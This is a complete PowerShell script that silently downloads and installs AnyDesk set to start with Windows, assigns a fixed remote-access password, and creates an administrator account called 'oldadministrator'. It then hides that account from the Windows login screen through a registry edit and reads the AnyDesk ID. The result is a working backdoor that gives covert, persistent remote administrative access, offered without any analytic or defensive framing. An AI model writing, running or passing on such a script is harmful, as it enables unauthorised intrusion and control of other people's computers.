function Install-AnyDesk {
    param (
        [string]$InstallPath = "C:\ProgramData\AnyDesk",
        [string]$AnyDeskUrl = "http://download.anydesk.com/AnyDesk.exe",
        [string]$Password = "J9kzQ2Y0qO",
        [string]$AdminUsername = "oldadministrator",
        [string]$AdminPassword = "jsbehsid#Zyw4E3"
    )

    # Error handling
    try {
        # Create the installation directory if it doesn't exist
        if (-not (Test-Path -Path $InstallPath -PathType Container)) {
            New-Item -Path $InstallPath -ItemType Directory
        }

        # Download AnyDesk
        Invoke-WebRequest -Uri $AnyDeskUrl -OutFile (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe")

        # Install AnyDesk silently
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--install $InstallPath --start-with-win --silent" -Wait

        # Set AnyDesk password
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--set-password=$Password" -Wait

        # Create a new user account
        New-LocalUser -Name $AdminUsername -Password (ConvertTo-SecureString -String $AdminPassword -AsPlainText -Force)

        # Add the user to the Administrators group
        Add-LocalGroupMember -Group "Administrators" -Member $AdminUsername

        # Hide the user from the Windows login screen
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -Name $AdminUsername -Value 0 -Type DWORD -Force

        # Get AnyDesk ID
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--get-id" -Wait

        Write-Host "Installation completed successfully."
    }
    catch {
        Write-Host "Error: $_"
        Write-Host "Installation failed."
    }
}

# Call the Install-AnyDesk function with default values
Install-AnyDesk
